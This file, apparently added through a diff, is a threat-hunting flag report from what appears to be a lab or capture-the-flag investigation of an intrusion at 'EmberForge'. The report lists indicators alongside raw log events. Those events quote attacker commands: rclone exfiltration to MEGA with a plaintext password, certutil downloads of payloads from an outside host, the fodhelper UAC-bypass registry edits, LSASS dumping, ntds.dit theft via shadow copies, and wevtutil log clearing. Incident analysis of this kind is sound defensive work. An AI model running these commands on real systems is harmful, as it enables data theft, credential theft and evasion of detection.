@@ -1,0 +1,172 @@
+============================================================
+  EMBERFORGE HUNT AGENT V2 — FLAG REPORT
+  Generated: 2026-05-08 05:47 UTC
+============================================================
+
+=== FLAG CANDIDATES ===
+
+FLAG: [INITIAL_FILE] | D:\review.dll | 90%
+FLAG: [MALICIOUS_DLL] | D:\review.dll | 90%
+FLAG: [IMPLANT_PATH] | C:\Users\Public\update.exe | 95%
+FLAG: [C2_IP] | 104.21.30.237 | 85%
+FLAG: [C2_IP] | 172.67.174.46 | 85%
+FLAG: [EXFIL_TOOL] | C:\Users\Public\rclone.exe --config C:\Users\Public\rclone.conf copy C:\GameDev mega:exfil -v | 95%
+FLAG: [EXFIL_CLOUD] | mega | 95%
+FLAG: [MEGA_ACCOUNT] | jwilson.vhr@proton.me | 95%
+FLAG: [SOURCE_DIR] | C:\GameDev | 95%
+FLAG: [ARCHIVE_NAME] | C:\Users\Public\gamedev.zip | 95%
+FLAG: [LSASS_DUMP_PATH] | C:\Windows\System32\lsass.dmp | 95%
+FLAG: [UAC_BYPASS_METHOD] | fodhelper.exe | 90%
+FLAG: [INJECTOR_PROCESS] | update.exe | 90%
+FLAG: [TARGET_PROCESS] | svchost.exe | 90%
+FLAG: [LATERAL_MOVE_METHOD] | C$ admin share | 90%
+FLAG: [RAT_INSTALLED] | AnyDesk | 95%
+FLAG: [SCHTASK_NAME] | WindowsUpdate | 90%
+FLAG: [LOG_CLEAR_TOOL] | wevtutil | 90%
+FLAG: [LOGS_CLEARED] | Security, System | 90%
+
+=== RAW EVIDENCE ===
+
+
+[EXFIL_TOOLS] — 11 events
+  {'UtcTime_s': '2026-01-30 23:06:36.115', 'Computer': 'EC2AMAZ-16V3AU4.emberforge.local', 'User_s': 'NT AUTHORITY\\SYSTEM', 'Image_s': 'C:\\Users\\Public\\rclone.exe', 'CommandLine_s': 'C:\\Users\\Public\\rclone.exe version', 'ParentImage_s': 'C:\\Users\\Public\\update.exe', 'SHA256_s': '44959138B2C9B295D7D558E229F0B7495A5AF446AB0FE472B8DC982B070E5A7B'}
+  {'UtcTime_s': '2026-01-30 23:07:45.695', 'Computer': 'EC2AMAZ-16V3AU4.emberforge.local', 'User_s': 'NT AUTHORITY\\SYSTEM', 'Image_s': 'C:\\Users\\Public\\rclone.exe', 'CommandLine_s': 'C:\\Users\\Public\\rclone.exe --config C:\\Users\\Public\\rclone.conf copy C:\\GameDev mega:exfil -v', 'ParentImage_s': 'C:\\Users\\Public\\update.exe', 'SHA256_s': '44959138B2C9B295D7D558E229F0B7495A5AF446AB0FE472B8DC982B070E5A7B'}
+  {'UtcTime_s': '2026-01-30 23:08:28.665', 'Computer': 'EC2AMAZ-16V3AU4.emberforge.local', 'User_s': 'NT AUTHORITY\\SYSTEM', 'Image_s': 'C:\\Users\\Public\\rclone.exe', 'CommandLine_s': 'C:\\Users\\Public\\rclone.exe copy C:\\GameDev mega:exfil --mega-user jwilson.vhr@proton.me --mega-pass Summer2024! -v', 'ParentImage_s': 'C:\\Users\\Public\\update.exe', 'SHA256_s': '44959138B2C9B295D7D558E229F0B7495A5AF446AB0FE472B8DC982B070E5A7B'}
+  {'UtcTime_s': '2026-01-30 23:08:34.728', 'Computer': 'EC2AMAZ-16V3AU4.emberforge.local', 'User_s': 'NT AUTHORITY\\SYSTEM', 'Image_s': 'C:\\Users\\Public\\rclone.exe', 'CommandLine_s': 'C:\\Users\\Public\\rclone.exe listremotes --config C:\\Users\\Public\\rclone.conf', 'ParentImage_s': 'C:\\Users\\Public\\update.exe', 'SHA256_s': '44959138B2C9B295D7D558E229F0B7495A5AF446AB0FE472B8DC982B070E5A7B'}
+  {'UtcTime_s': '2026-01-30 23:10:31.697', 'Computer': 'EC2AMAZ-16V3AU4.emberforge.local', 'User_s': 'NT AUTHORITY\\SYSTEM', 'Image_s': 'C:\\Users\\Public\\rclone.exe', 'CommandLine_s': 'C:\\Users\\Public\\rclone.exe obscure Summer2024!', 'ParentImage_s': 'C:\\Users\\Public\\update.exe', 'SHA256_s': '44959138B2C9B295D7D558E229F0B7495A5AF446AB0FE472B8DC982B070E5A7B'}
+
+[COMPRESSION] — 4 events
+  {'UtcTime_s': '2026-01-30 21:24:04.656', 'Computer': 'EC2AMAZ-B9GHHO6.emberforge.local', 'User_s': 'EMBERFORGE\\lmartin', 'CommandLine_s': '"C:\\Program Files\\7-Zip\\7zG.exe" x -o"C:\\Users\\lmartin.EMBERFORGE\\Downloads\\EmberForge_Review\\" -spe -an -ai#7zMap13315:120:7zEvent17197', 'ParentImage_s': 'C:\\Windows\\explorer.exe'}
+  {'UtcTime_s': '2026-01-30 23:11:28.112', 'Computer': 'EC2AMAZ-16V3AU4.emberforge.local', 'User_s': 'NT AUTHORITY\\SYSTEM', 'CommandLine_s': 'powershell.exe -c "Compress-Archive -Path C:\\GameDev -DestinationPath C:\\Users\\Public\\gamedev.zip"', 'ParentImage_s': 'C:\\Users\\Public\\update.exe'}
+  {'UtcTime_s': '2026-01-30 23:11:44.379', 'Computer': 'EC2AMAZ-16V3AU4.emberforge.local', 'User_s': 'NT AUTHORITY\\SYSTEM', 'CommandLine_s': 'C:\\Users\\Public\\rclone.exe --config C:\\Users\\Public\\rclone.conf copy C:\\Users\\Public\\gamedev.zip mega:exfil -v', 'ParentImage_s': 'C:\\Users\\Public\\update.exe'}
+  {'UtcTime_s': '2026-01-30 23:12:52.732', 'Computer': 'EC2AMAZ-16V3AU4.emberforge.local', 'User_s': 'NT AUTHORITY\\SYSTEM', 'CommandLine_s': 'C:\\Users\\Public\\rclone.exe --config C:\\Users\\Public\\rclone.conf copy C:\\Users\\Public\\gamedev.zip mega:exfil -v', 'ParentImage_s': 'C:\\Users\\Public\\update.exe'}
+
+[C2_BEACONING] — 16 events
+  {'DestinationIp_s': '172.67.174.46', 'DestinationHostname_s': '-', 'Computer': 'EC2AMAZ-B9GHHO6.emberforge.local', 'Count': '2496', 'Processes': '["C:\\\\Windows\\\\System32\\\\rundll32.exe","C:\\\\Users\\\\Public\\\\update.exe"]', 'Ports': '["443"]', 'First': '2026-01-30 21:32:08.793', 'Last': '2026-01-30 23:52:48.052'}
+  {'DestinationIp_s': '104.21.30.237', 'DestinationHostname_s': '-', 'Computer': 'EC2AMAZ-B9GHHO6.emberforge.local', 'Count': '2342', 'Processes': '["C:\\\\Users\\\\Public\\\\update.exe","C:\\\\Windows\\\\System32\\\\rundll32.exe"]', 'Ports': '["80","443"]', 'First': '2026-01-30 21:27:06.402', 'Last': '2026-01-30 23:59:21.544'}
+  {'DestinationIp_s': '104.21.30.237', 'DestinationHostname_s': '-', 'Computer': 'EC2AMAZ-16V3AU4.emberforge.local', 'Count': '986', 'Processes': '["C:\\\\Users\\\\Public\\\\update.exe"]', 'Ports': '["80","443"]', 'First': '2026-01-30 23:00:56.731', 'Last': '2026-01-30 23:59:20.654'}
+  {'DestinationIp_s': '172.67.174.46', 'DestinationHostname_s': '-', 'Computer': 'EC2AMAZ-16V3AU4.emberforge.local', 'Count': '257', 'Processes': '["C:\\\\Users\\\\Public\\\\update.exe"]', 'Ports': '["443"]', 'First': '2026-01-30 23:07:39.467', 'Last': '2026-01-30 23:42:46.362'}
+  {'DestinationIp_s': '239.255.102.18', 'DestinationHostname_s': '-', 'Computer': 'EC2AMAZ-B9GHHO6.emberforge.local', 'Count': '129', 'Processes': '["C:\\\\ProgramData\\\\AnyDesk\\\\AnyDesk.exe"]', 'Ports': '["50001","50003","50002"]', 'First': '2026-01-30 22:19:38.234', 'Last': '2026-01-30 22:41:12.959'}
+
+[DNS_QUERIES] — 70 events
+  {'UtcTime_s': '2026-01-30 21:13:22.311', 'Computer': 'EC2AMAZ-EEU3IA2.emberforge.local', 'QueryName_s': 'wpad', 'Image_s': 'C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe'}
+  {'UtcTime_s': '2026-01-30 21:13:22.358', 'Computer': 'EC2AMAZ-EEU3IA2.emberforge.local', 'QueryName_s': 'wpad', 'Image_s': 'C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe'}
+  {'UtcTime_s': '2026-01-30 21:13:22.359', 'Computer': 'EC2AMAZ-EEU3IA2.emberforge.local', 'QueryName_s': 'wpad', 'Image_s': 'C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe'}
+  {'UtcTime_s': '2026-01-30 21:13:30.344', 'Computer': 'EC2AMAZ-EEU3IA2.emberforge.local', 'QueryName_s': 'wpad', 'Image_s': 'C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe'}
+  {'UtcTime_s': '2026-01-30 21:13:46.159', 'Computer': 'EC2AMAZ-B9GHHO6.emberforge.local', 'QueryName_s': 'ssm.us-east-1.amazonaws.com', 'Image_s': 'C:\\Program Files\\Amazon\\SSM\\ssm-agent-worker.exe'}
+
+[DROPPED_EXE] — 79 events
+  {'UtcTime_s': '2026-01-30 21:26:09.479', 'Computer': 'EC2AMAZ-B9GHHO6.emberforge.local', 'TargetFilename_s': 'C:\\Users\\LMARTI~1.EMB\\AppData\\Local\\Temp\\3\\msedge_chrome_Unpacker_BeginUnzipping4660_1414750197\\domain_actions.dll', 'Image_s': 'C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe'}
+  {'UtcTime_s': '2026-01-30 21:29:57.892', 'Computer': 'EC2AMAZ-B9GHHO6.emberforge.local', 'TargetFilename_s': 'C:\\Users\\LMARTI~1.EMB\\AppData\\Local\\Temp\\3\\msedge_chrome_Unpacker_BeginUnzipping4660_615865668\\well_known_domains.dll', 'Image_s': 'C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe'}
+  {'UtcTime_s': '2026-01-30 21:33:32.382', 'Computer': 'EC2AMAZ-B9GHHO6.emberforge.local', 'TargetFilename_s': 'C:\\Users\\LMARTI~1.EMB\\AppData\\Local\\Temp\\3\\msedge_chrome_Unpacker_BeginUnzipping4660_1473904238\\Microsoft.CognitiveServices.Speech.core.dll', 'Image_s': 'C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe'}
+  {'UtcTime_s': '2026-01-30 21:36:34.586', 'Computer': 'EC2AMAZ-B9GHHO6.emberforge.local', 'TargetFilename_s': 'C:\\Users\\Public\\update.exe', 'Image_s': 'C:\\Windows\\System32\\rundll32.exe'}
+  {'UtcTime_s': '2026-01-30 21:40:53.945', 'Computer': 'EC2AMAZ-B9GHHO6.emberforge.local', 'TargetFilename_s': 'C:\\Users\\LMARTI~1.EMB\\AppData\\Local\\Temp\\3\\msedge_chrome_Unpacker_BeginUnzipping4660_419801716\\_platform_specific\\win_x64\\widevinecdm.dll', 'Image_s': 'C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe'}
+
+[RUNDLL32] — 7 events
+  {'UtcTime_s': '2026-01-30 21:17:37.343', 'Computer': 'EC2AMAZ-16V3AU4.emberforge.local', 'User_s': 'EMBERFORGE\\jsmith', 'CommandLine_s': 'rundll32.exe AppXDeploymentExtensions.OneCore.dll,ShellRefresh', 'ParentImage_s': 'C:\\Windows\\System32\\svchost.exe', 'SHA256_s': '0BB68E54629555FB9F70FB8D7B95FE1A5F987EEEEF57DE0A2671EEB14063CED1'}
+  {'UtcTime_s': '2026-01-30 21:18:05.522', 'Computer': 'EC2AMAZ-B9GHHO6.emberforge.local', 'User_s': 'NT AUTHORITY\\SYSTEM', 'CommandLine_s': '"C:\\Windows\\system32\\rundll32.exe" /d acproxy.dll,PerformAutochkOperations', 'ParentImage_s': 'C:\\Windows\\System32\\svchost.exe', 'SHA256_s': '0BB68E54629555FB9F70FB8D7B95FE1A5F987EEEEF57DE0A2671EEB14063CED1'}
+  {'UtcTime_s': '2026-01-30 21:18:06.813', 'Computer': 'EC2AMAZ-EEU3IA2.emberforge.local', 'User_s': 'NT AUTHORITY\\SYSTEM', 'CommandLine_s': '"C:\\Windows\\system32\\rundll32.exe" /d acproxy.dll,PerformAutochkOperations', 'ParentImage_s': 'C:\\Windows\\System32\\svchost.exe', 'SHA256_s': '0BB68E54629555FB9F70FB8D7B95FE1A5F987EEEEF57DE0A2671EEB14063CED1'}
+  {'UtcTime_s': '2026-01-30 21:18:32.284', 'Computer': 'EC2AMAZ-16V3AU4.emberforge.local', 'User_s': 'NT AUTHORITY\\SYSTEM', 'CommandLine_s': '"C:\\Windows\\system32\\rundll32.exe" /d acproxy.dll,PerformAutochkOperations', 'ParentImage_s': 'C:\\Windows\\System32\\svchost.exe', 'SHA256_s': '0BB68E54629555FB9F70FB8D7B95FE1A5F987EEEEF57DE0A2671EEB14063CED1'}
+  {'UtcTime_s': '2026-01-30 21:22:17.476', 'Computer': 'EC2AMAZ-B9GHHO6.emberforge.local', 'User_s': 'EMBERFORGE\\lmartin', 'CommandLine_s': 'C:\\Windows\\System32\\rundll32.exe C:\\Windows\\System32\\shell32.dll,SHCreateLocalServerRunDll {9aa46009-3ce0-458a-a354-715610a075e6} -Embedding', 'ParentImage_s': 'C:\\Windows\\System32\\svchost.exe', 'SHA256_s': '0BB68E54629555FB9F70FB8D7B95FE1A5F987EEEEF57DE0A2671EEB14063CED1'}
+
+[LSASS_DUMP] — 2 events
+  {'UtcTime_s': '2026-01-30 21:48:13.892', 'Computer': 'EC2AMAZ-B9GHHO6.emberforge.local', 'User_s': 'EMBERFORGE\\lmartin', 'Image_s': 'C:\\Users\\Public\\update.exe', 'TargetFilename_s': 'C:\\Windows\\System32\\lsass.dmp'}
+  {'UtcTime_s': '2026-01-30 21:48:13.933', 'Computer': 'EC2AMAZ-B9GHHO6.emberforge.local', 'User_s': 'EMBERFORGE\\lmartin', 'Image_s': 'C:\\Users\\Public\\update.exe', 'TargetFilename_s': 'C:\\Windows\\System32\\lsass.dmp'}
+
+[NTDS_VSS] — 14 events
+  {'UtcTime_s': '2026-01-30 23:34:56.018', 'Computer': 'EC2AMAZ-EEU3IA2.emberforge.local', 'User_s': 'NT AUTHORITY\\SYSTEM', 'CommandLine_s': 'C:\\Windows\\system32\\cmd.exe /Q /c echo C:\\Windows\\system32\\cmd.exe /C vssadmin list shadows /for=C: ^&gt; C:\\Windows\\Temp\\__output &gt; C:\\Windows\\TEMP\\execute.bat &amp; C:\\Windows\\system32\\cmd.exe /Q', 'ParentImage_s': 'C:\\Windows\\System32\\services.exe'}
+  {'UtcTime_s': '2026-01-30 23:34:56.059', 'Computer': 'EC2AMAZ-EEU3IA2.emberforge.local', 'User_s': 'NT AUTHORITY\\SYSTEM', 'CommandLine_s': 'C:\\Windows\\system32\\cmd.exe  /C vssadmin list shadows /for=C:', 'ParentImage_s': 'C:\\Windows\\System32\\cmd.exe'}
+  {'UtcTime_s': '2026-01-30 23:34:56.069', 'Computer': 'EC2AMAZ-EEU3IA2.emberforge.local', 'User_s': 'NT AUTHORITY\\SYSTEM', 'CommandLine_s': 'vssadmin  list shadows /for=C:', 'ParentImage_s': 'C:\\Windows\\System32\\cmd.exe'}
+  {'UtcTime_s': '2026-01-30 23:35:04.524', 'Computer': 'EC2AMAZ-EEU3IA2.emberforge.local', 'User_s': 'NT AUTHORITY\\SYSTEM', 'CommandLine_s': 'C:\\Windows\\system32\\cmd.exe /Q /c echo C:\\Windows\\system32\\cmd.exe /C vssadmin create shadow /For=C: ^&gt; C:\\Windows\\Temp\\__output &gt; C:\\Windows\\TEMP\\execute.bat &amp; C:\\Windows\\system32\\cmd.exe /', 'ParentImage_s': 'C:\\Windows\\System32\\services.exe'}
+  {'UtcTime_s': '2026-01-30 23:35:04.567', 'Computer': 'EC2AMAZ-EEU3IA2.emberforge.local', 'User_s': 'NT AUTHORITY\\SYSTEM', 'CommandLine_s': 'C:\\Windows\\system32\\cmd.exe  /C vssadmin create shadow /For=C:', 'ParentImage_s': 'C:\\Windows\\System32\\cmd.exe'}
+
+[INJECTION] — 8 events
+  {'UtcTime_s': '2026-01-30 21:18:09.850', 'Computer': 'EC2AMAZ-B9GHHO6.emberforge.local'}
+  {'UtcTime_s': '2026-01-30 21:18:11.012', 'Computer': 'EC2AMAZ-B9GHHO6.emberforge.local'}
+  {'UtcTime_s': '2026-01-30 21:18:22.292', 'Computer': 'EC2AMAZ-16V3AU4.emberforge.local'}
+  {'UtcTime_s': '2026-01-30 21:18:23.314', 'Computer': 'EC2AMAZ-16V3AU4.emberforge.local'}
+  {'UtcTime_s': '2026-01-30 21:18:31.032', 'Computer': 'EC2AMAZ-EEU3IA2.emberforge.local'}
+
+[UAC_BYPASS] — 9 events
+  {'UtcTime_s': '2026-01-30 21:38:33.686', 'Computer': 'EC2AMAZ-B9GHHO6.emberforge.local', 'User_s': 'EMBERFORGE\\lmartin', 'Image_s': 'C:\\Windows\\System32\\reg.exe', 'CommandLine_s': 'reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /ve /t REG_SZ /d C:\\Users\\Public\\update.exe /f'}
+  {'UtcTime_s': '2026-01-30 21:38:33.745', 'Computer': 'EC2AMAZ-B9GHHO6.emberforge.local', 'User_s': 'EMBERFORGE\\lmartin', 'Image_s': 'C:\\Windows\\system32\\reg.exe', 'TargetObject_s': 'HKU\\S-1-5-21-2652116244-673025608-2393369881-1103_Classes\\ms-settings\\shell\\open\\command\\(Default)', 'Details_s': 'C:\\Users\\Public\\update.exe'}
+  {'UtcTime_s': '2026-01-30 21:38:50.829', 'Computer': 'EC2AMAZ-B9GHHO6.emberforge.local', 'User_s': 'EMBERFORGE\\lmartin', 'Image_s': 'C:\\Windows\\System32\\reg.exe', 'CommandLine_s': 'reg add HKCU\\Software\\Classes\\ms-settings\\shell\\open\\command /v DelegateExecute /t REG_SZ /d "" /f'}
+  {'UtcTime_s': '2026-01-30 21:38:50.904', 'Computer': 'EC2AMAZ-B9GHHO6.emberforge.local', 'User_s': 'EMBERFORGE\\lmartin', 'Image_s': 'C:\\Windows\\system32\\reg.exe', 'TargetObject_s': 'HKU\\S-1-5-21-2652116244-673025608-2393369881-1103_Classes\\ms-settings\\shell\\open\\command\\DelegateExecute', 'Details_s': '(Empty)'}
+  {'UtcTime_s': '2026-01-30 21:39:02.511', 'Computer': 'EC2AMAZ-B9GHHO6.emberforge.local', 'User_s': 'EMBERFORGE\\lmartin', 'Image_s': 'C:\\Windows\\System32\\fodhelper.exe', 'CommandLine_s': 'fodhelper.exe'}
+
+[PERSISTENCE] — 17 events
+  {'UtcTime_s': '2026-01-30 21:13:22.740', 'Computer': 'EC2AMAZ-EEU3IA2.emberforge.local', 'User_s': 'EMBERFORGE\\Administrator', 'CommandLine_s': '"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe" --type=utility --utility-sub-type=network.mojom.NetworkService --lang=en-US --service-sandbox-type=none --startup-read-main-dll --metrics', 'ParentImage_s': 'C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe'}
+  {'UtcTime_s': '2026-01-30 21:13:22.744', 'Computer': 'EC2AMAZ-EEU3IA2.emberforge.local', 'User_s': 'EMBERFORGE\\Administrator', 'CommandLine_s': '"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe" --type=gpu-process --gpu-preferences=SAAAAAAAAADgAAAEAAAAAAAAAAAAAGAAAQAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAAAAAAAAAAAQAAAAAAAAABAAAAAAAAAACAAA', 'ParentImage_s': 'C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe'}
+  {'UtcTime_s': '2026-01-30 21:13:22.757', 'Computer': 'EC2AMAZ-EEU3IA2.emberforge.local', 'User_s': 'EMBERFORGE\\Administrator', 'CommandLine_s': '"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe" --type=utility --utility-sub-type=storage.mojom.StorageService --lang=en-US --service-sandbox-type=service --startup-read-main-dll --metr', 'ParentImage_s': 'C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe'}
+  {'UtcTime_s': '2026-01-30 21:20:28.384', 'Computer': 'EC2AMAZ-B9GHHO6.emberforge.local', 'User_s': 'EMBERFORGE\\lmartin', 'CommandLine_s': '"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe" --type=utility --utility-sub-type=network.mojom.NetworkService --lang=en-US --service-sandbox-type=none --startup-read-main-dll --metrics', 'ParentImage_s': 'C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe'}
+  {'UtcTime_s': '2026-01-30 21:20:28.387', 'Computer': 'EC2AMAZ-B9GHHO6.emberforge.local', 'User_s': 'EMBERFORGE\\lmartin', 'CommandLine_s': '"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe" --type=gpu-process --gpu-preferences=SAAAAAAAAADgAAAEAAAAAAAAAAAAAGAAAQAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAAAAAAAAAAAQAAAAAAAAABAAAAAAAAAACAAA', 'ParentImage_s': 'C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe'}
+
+[NEW_ACCOUNTS] — 1 events
+  {'TimeGenerated': '2026-02-10 22:37:08.309023+00:00', 'Computer': 'EC2AMAZ-EEU3IA2.emberforge.local', 'Caller_User_Name_s': 'EC2AMAZ-EEU3IA2$'}
+
+[GROUP_CHANGES] — 1 events
+  {'TimeGenerated': '2026-02-10 22:37:02.284328+00:00', 'Computer': 'EC2AMAZ-EEU3IA2.emberforge.local', 'MemberName_s': 'CN=svc_backup,CN=Users,DC=emberforge,DC=local', 'Group_Name_s': 'Domain Admins'}
+
+[SERVICES] — 18 events
+  {'TimeGenerated': '2026-02-10 22:37:17.420457+00:00', 'Computer': 'EC2AMAZ-EEU3IA2.emberforge.local', 'ServiceName': 'YOzedHWI', 'ServicePath': '%COMSPEC% /Q /c echo %COMSPEC% /C vssadmin delete shadows /shadow="{0ed56514-fe1b-4ef9-a2b1-d468122c1920}" /Quiet ^&gt; %SYSTEMROOT%\\Temp\\__output &gt; %TEMP%\\execute.bat &amp; %COMSPEC% /Q /c %TEMP%\\'}
+  {'TimeGenerated': '2026-02-10 22:37:17.420457+00:00', 'Computer': 'EC2AMAZ-EEU3IA2.emberforge.local', 'ServiceName': 'fHxLXpku', 'ServicePath': '%COMSPEC% /Q /c echo %COMSPEC% /C copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\ntds.dit %SYSTEMROOT%\\Temp\\nyMdRNSp.tmp ^&gt; %SYSTEMROOT%\\Temp\\__output &gt; %TEMP%\\execute.bat &am'}
+  {'TimeGenerated': '2026-02-10 22:37:18.882140+00:00', 'Computer': 'EC2AMAZ-EEU3IA2.emberforge.local', 'ServiceName': 'JKEpKhcH', 'ServicePath': '%COMSPEC% /Q /c echo %COMSPEC% /C vssadmin create shadow /For=C: ^&gt; %SYSTEMROOT%\\Temp\\__output &gt; %TEMP%\\execute.bat &amp; %COMSPEC% /Q /c %TEMP%\\execute.bat &amp; del %TEMP%\\execute.bat'}
+  {'TimeGenerated': '2026-02-10 22:37:18.882140+00:00', 'Computer': 'EC2AMAZ-EEU3IA2.emberforge.local', 'ServiceName': 'ROeVQtpt', 'ServicePath': '%COMSPEC% /Q /c echo %COMSPEC% /C vssadmin list shadows /for=C: ^&gt; %SYSTEMROOT%\\Temp\\__output &gt; %TEMP%\\execute.bat &amp; %COMSPEC% /Q /c %TEMP%\\execute.bat &amp; del %TEMP%\\execute.bat'}
+  {'TimeGenerated': '2026-02-10 22:37:20.379797+00:00', 'Computer': 'EC2AMAZ-EEU3IA2.emberforge.local', 'ServiceName': 'zgECPPnE', 'ServicePath': '%COMSPEC% /Q /c echo %COMSPEC% /C vssadmin list shadows /for=C: ^&gt; %SYSTEMROOT%\\Temp\\__output &gt; %TEMP%\\execute.bat &amp; %COMSPEC% /Q /c %TEMP%\\execute.bat &amp; del %TEMP%\\execute.bat'}
+
+[REMOTE_ACCESS] — 30 events
+  {'UtcTime_s': '2026-01-30 22:10:52.789', 'Computer': 'EC2AMAZ-16V3AU4.emberforge.local', 'User_s': 'NT AUTHORITY\\SYSTEM', 'CommandLine_s': 'C:\\Windows\\system32\\cmd.exe /Q /c echo certutil -urlcache -split -f http://sync.cloud-endpoint.net:8080/AnyDesk.exe C:\\Users\\Public\\AnyDesk.exe ^&gt; \\\\EC2AMAZ-16V3AU4\\C$\\__output_QoCDsxXQ 2^&gt;^&amp', 'ParentImage_s': 'C:\\Windows\\System32\\services.exe', 'SHA256_s': 'EB71EA69DD19F728AB9240565E8C7EFB59821E19E3788E289301E1E74940C208'}
+  {'UtcTime_s': '2026-01-30 22:10:52.841', 'Computer': 'EC2AMAZ-16V3AU4.emberforge.local', 'User_s': 'NT AUTHORITY\\SYSTEM', 'CommandLine_s': 'certutil  -urlcache -split -f http://sync.cloud-endpoint.net:8080/AnyDesk.exe C:\\Users\\Public\\AnyDesk.exe', 'ParentImage_s': 'C:\\Windows\\System32\\cmd.exe', 'SHA256_s': 'A15F554CCE4E5EA0E66BFBD21D0D0934E40DDB5541E8AF99B9EAC82A39A36713'}
+  {'UtcTime_s': '2026-01-30 22:19:34.895', 'Computer': 'EC2AMAZ-B9GHHO6.emberforge.local', 'User_s': 'NT AUTHORITY\\SYSTEM', 'CommandLine_s': 'cmd.exe /c C:\\Users\\Public\\AnyDesk.exe --install C:\\ProgramData\\AnyDesk --start-with-win --silent', 'ParentImage_s': 'C:\\Windows\\System32\\spoolsv.exe', 'SHA256_s': 'EB71EA69DD19F728AB9240565E8C7EFB59821E19E3788E289301E1E74940C208'}
+  {'UtcTime_s': '2026-01-30 22:19:34.931', 'Computer': 'EC2AMAZ-B9GHHO6.emberforge.local', 'User_s': 'NT AUTHORITY\\SYSTEM', 'CommandLine_s': 'C:\\Users\\Public\\AnyDesk.exe  --install C:\\ProgramData\\AnyDesk --start-with-win --silent', 'ParentImage_s': 'C:\\Windows\\System32\\cmd.exe', 'SHA256_s': '2E3168861AB03AC6632268D1B42F75204F3E9CBD5F5F4B51082A6CBDA5D0A2A7'}
+  {'UtcTime_s': '2026-01-30 22:19:35.958', 'Computer': 'EC2AMAZ-B9GHHO6.emberforge.local', 'User_s': 'NT AUTHORITY\\SYSTEM', 'CommandLine_s': '"C:\\ProgramData\\AnyDesk\\AnyDesk.exe" --service', 'ParentImage_s': 'C:\\Windows\\System32\\services.exe', 'SHA256_s': '2E3168861AB03AC6632268D1B42F75204F3E9CBD5F5F4B51082A6CBDA5D0A2A7'}
+
+[CERTUTIL] — 6 events
+  {'UtcTime_s': '2026-01-30 22:10:52.789', 'Computer': 'EC2AMAZ-16V3AU4.emberforge.local', 'User_s': 'NT AUTHORITY\\SYSTEM', 'CommandLine_s': 'C:\\Windows\\system32\\cmd.exe /Q /c echo certutil -urlcache -split -f http://sync.cloud-endpoint.net:8080/AnyDesk.exe C:\\Users\\Public\\AnyDesk.exe ^&gt; \\\\EC2AMAZ-16V3AU4\\C$\\__output_QoCDsxXQ 2^&gt;^&amp'}
+  {'UtcTime_s': '2026-01-30 22:10:52.841', 'Computer': 'EC2AMAZ-16V3AU4.emberforge.local', 'User_s': 'NT AUTHORITY\\SYSTEM', 'CommandLine_s': 'certutil  -urlcache -split -f http://sync.cloud-endpoint.net:8080/AnyDesk.exe C:\\Users\\Public\\AnyDesk.exe'}
+  {'UtcTime_s': '2026-01-30 22:18:02.524', 'Computer': 'EC2AMAZ-16V3AU4.emberforge.local', 'User_s': 'NT AUTHORITY\\SYSTEM', 'CommandLine_s': 'C:\\Windows\\system32\\cmd.exe /Q /c echo certutil -urlcache -f http://sync.cloud-endpoint.net:8080/update.exe C:\\Users\\Public\\update.exe ^&gt; \\\\EC2AMAZ-16V3AU4\\C$\\__output_yKDFWqSQ 2^&gt;^&amp;1 &gt; C'}
+  {'UtcTime_s': '2026-01-30 22:18:02.618', 'Computer': 'EC2AMAZ-16V3AU4.emberforge.local', 'User_s': 'NT AUTHORITY\\SYSTEM', 'CommandLine_s': 'certutil  -urlcache -f http://sync.cloud-endpoint.net:8080/update.exe C:\\Users\\Public\\update.exe'}
+  {'UtcTime_s': '2026-01-30 22:27:47.298', 'Computer': 'EC2AMAZ-16V3AU4.emberforge.local', 'User_s': 'NT AUTHORITY\\SYSTEM', 'CommandLine_s': '"C:\\Windows\\System32\\cmd.EXE" /F:ON /c certutil -urlcache -f http://sync.cloud-endpoint.net:8080/update.exe C:\\Users\\Public\\update.exe &gt; \\Windows\\Temp\\/FNAhKQCE 2&gt;&amp;1'}
+
+[LOG_CLEARING] — 6 events
+  {'UtcTime_s': '2026-01-30 23:50:49.975', 'Computer': 'EC2AMAZ-EEU3IA2.emberforge.local', 'User_s': 'NT AUTHORITY\\SYSTEM', 'CommandLine_s': '"C:\\Windows\\System32\\cmd.exe" /F:ON /Q /C wevtutil cl Security &gt; \\Windows\\Temp\\/hdXjZBEP 2&gt;&amp;1'}
+  {'UtcTime_s': '2026-01-30 23:50:50.010', 'Computer': 'EC2AMAZ-EEU3IA2.emberforge.local', 'User_s': 'NT AUTHORITY\\SYSTEM', 'CommandLine_s': 'wevtutil  cl Security'}
+  {'UtcTime_s': '2026-01-30 23:51:06.224', 'Computer': 'EC2AMAZ-EEU3IA2.emberforge.local', 'User_s': 'NT AUTHORITY\\SYSTEM', 'CommandLine_s': '"C:\\Windows\\..\\Windows\\System32\\cmd.exe" /c wevtutil cl System &gt; \\Windows\\Temp\\/NKMDWYgu 2&gt;&amp;1'}
+  {'UtcTime_s': '2026-01-30 23:51:06.258', 'Computer': 'EC2AMAZ-EEU3IA2.emberforge.local', 'User_s': 'NT AUTHORITY\\SYSTEM', 'CommandLine_s': 'wevtutil  cl System'}
